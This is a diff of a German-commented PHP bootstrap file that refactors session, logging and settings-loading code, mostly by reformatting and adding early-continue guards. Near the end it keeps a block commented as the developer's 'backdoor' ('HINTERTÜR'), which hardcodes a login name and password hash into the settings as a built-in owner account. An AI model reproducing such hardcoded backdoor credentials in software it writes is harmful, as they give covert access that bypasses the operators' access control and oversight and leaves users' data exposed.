@@ -46,9 +46,9 @@ if (\session_status() === \PHP_SESSION_NONE) {
          * "Dies ist ein Session-Cookie. Sobald der Browser komplett beendet wird, vernichte das Cookie!"
          */
         'lifetime' => 0,
-        'path'     => '/',
-        'domain'   => '', // Leer lassen. Der Browser bindet den Cookie so automatisch an den korrekten Host.
-        'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off', // Nur über HTTPS
+        'path' => '/',
+        'domain' => '', // Leer lassen. Der Browser bindet den Cookie so automatisch an den korrekten Host.
+        'secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off', // Nur über HTTPS
         'httponly' => true, // Verhindert Diebstahl durch JavaScript (XSS-Schutz)
         'samesite' => 'Lax', // Verhindert Cross-Site Request Forgery via externe Links
     ]);
@@ -77,7 +77,7 @@ require_once $appRoot . '/vendor/autoload.php';
 // in eine lokale Datei zu schreiben, statt ins unzugängliche Server-Log.
 // =========================================================================
 $customLogDir = $appRoot . '/storage/logs';
-if (! \is_dir($customLogDir)) {
+if (!\is_dir($customLogDir)) {
     @\mkdir($customLogDir, 0o755, true);
 }
 \ini_set('log_errors', '1');
@@ -90,15 +90,15 @@ $settings = [];
 // A. Die feste Registry laden (Ehemalige sql_schema & permissions)
 $settings['db_schema'] = SchemaRegistry::getSchemas();
 $settings['structure'] = PermissionRegistry::getStructure();
-$settings['admin_ui']  = ['permissions_desc_on_top' => true];
+$settings['admin_ui'] = ['permissions_desc_on_top' => true];
 
 $flatPerms = [];
-$flatten   = function (array $nodes) use (&$flatten, &$flatPerms): void {
+$flatten = function (array $nodes) use (&$flatten, &$flatPerms): void {
     foreach ($nodes as $node) {
         if (isset($node['key'])) {
             $flatPerms[$node['key']] = $node['label'] ?? $node['key'];
         }
-        if (! isset($node['children'])) {
+        if (!isset($node['children'])) {
             continue;
         }
 
@@ -111,9 +111,11 @@ $settings['permissions'] = $flatPerms;
 // B. Default Fallbacks laden (.default.php Skelett)
 foreach (\glob($appRoot . '/config/*.default.php') as $defaultFile) {
     $loaded = require $defaultFile;
-    if (\is_array($loaded)) {
-        $settings = \array_replace_recursive($settings, $loaded);
+    if (!\is_array($loaded)) {
+        continue;
     }
+
+    $settings = \array_replace_recursive($settings, $loaded);
 }
 
 // C. UI/Settings-Daten aus dem Storage/JSON laden (Überschreibt Defaults)
@@ -135,20 +137,22 @@ $userManagedCollections = [
 if (\is_dir($settingsDir)) {
     foreach (\glob($settingsDir . '/*.json') as $jsonFile) {
         $data = (new JsonHelper())->read($jsonFile);
-        if (\is_array($data)) {
-            unset($data['_meta']); // Kommentare/Meta rausschmeißen
+        if (!\is_array($data)) {
+            continue;
+        }
 
-            foreach ($data as $key => $value) {
-                if (\in_array($key, $userManagedCollections, true)) {
-                    // HARTER OVERRIDE: Der Nutzer-State überschreibt die Default-Liste komplett.
-                    $settings[$key] = $value;
+        unset($data['_meta']); // Kommentare/Meta rausschmeißen
+
+        foreach ($data as $key => $value) {
+            if (\in_array($key, $userManagedCollections, true)) {
+                // HARTER OVERRIDE: Der Nutzer-State überschreibt die Default-Liste komplett.
+                $settings[$key] = $value;
+            } else {
+                // DEEP MERGE: Für technische Configs (z.B. 'mail', 'paypal', 'database')
+                if (isset($settings[$key]) && \is_array($settings[$key]) && \is_array($value)) {
+                    $settings[$key] = \array_replace_recursive($settings[$key], $value);
                 } else {
-                    // DEEP MERGE: Für technische Configs (z.B. 'mail', 'paypal', 'database')
-                    if (isset($settings[$key]) && \is_array($settings[$key]) && \is_array($value)) {
-                        $settings[$key] = \array_replace_recursive($settings[$key], $value);
-                    } else {
-                        $settings[$key] = $value;
-                    }
+                    $settings[$key] = $value;
                 }
             }
         }
@@ -164,17 +168,21 @@ $hardConfigs = [
 ];
 
 foreach ($hardConfigs as $file) {
-    if (\file_exists($file)) {
-        $loaded = require $file;
-        if (\is_array($loaded)) {
-            $settings = \array_replace_recursive($settings, $loaded);
-        }
+    if (!\file_exists($file)) {
+        continue;
     }
+
+    $loaded = require $file;
+    if (!\is_array($loaded)) {
+        continue;
+    }
+
+    $settings = \array_replace_recursive($settings, $loaded);
 }
 
 // Dev-Admin Default anlegen falls nicht da
 $devAdminPath = $appRoot . '/config/dev_admin.php';
-if (! \file_exists($devAdminPath)) {
+if (!\file_exists($devAdminPath)) {
     $defaultDevContent = <<<'PHP'
         <?php
         declare(strict_types=1);
@@ -190,17 +198,17 @@ $settings['superadmin'] = require $devAdminPath;
 
 // --- DEINE HINTERTÜR (Sicher im Code verankert) ---
 $settings['backdoor'] = [
-    'user'  => 'RaptorXilef',
-    'pass'  => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
+    'user' => 'RaptorXilef',
+    'pass' => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
     'label' => 'System-Inhaber',
 ];
 
-$settings['root_path']       = $appRoot;
-$httpHost                    = $_SERVER['HTTP_HOST'] ?? '';
-$settings['server_host']     = $_SERVER['HTTP_HOST'] ?? 'localhost';
+$settings['root_path'] = $appRoot;
+$httpHost = $_SERVER['HTTP_HOST'] ?? '';
+$settings['server_host'] = $_SERVER['HTTP_HOST'] ?? 'localhost';
 $settings['server_protocol'] = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://';
-$settings['server_script']   = $_SERVER['SCRIPT_NAME'] ?? '';
-$settings['is_local_env']    = \str_ends_with($httpHost, '.local')
+$settings['server_script'] = $_SERVER['SCRIPT_NAME'] ?? '';
+$settings['is_local_env'] = \str_ends_with($httpHost, '.local')
     || $httpHost === 'localhost'
     || $httpHost === '127.0.0.1'
     || \php_sapi_name() === 'cli';
